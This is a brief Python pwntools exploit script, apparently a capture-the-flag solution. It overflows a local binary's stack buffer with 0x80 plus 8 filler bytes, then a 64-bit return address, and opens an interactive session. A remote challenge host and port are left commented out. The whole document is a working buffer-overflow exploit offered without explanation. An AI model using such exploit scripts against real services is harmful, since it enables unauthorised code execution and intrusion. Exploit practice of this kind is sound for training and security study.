from pwn import *
#host = '61.147.171.105'
#port = 53562
ELF("a.out")
p = process('./a.out')
#p = connect(host, port)
payload = 'a'* 0x80 + "a" * 8 + p64(0x0000000000001169)
p.sendline(payload)
p.interactive()
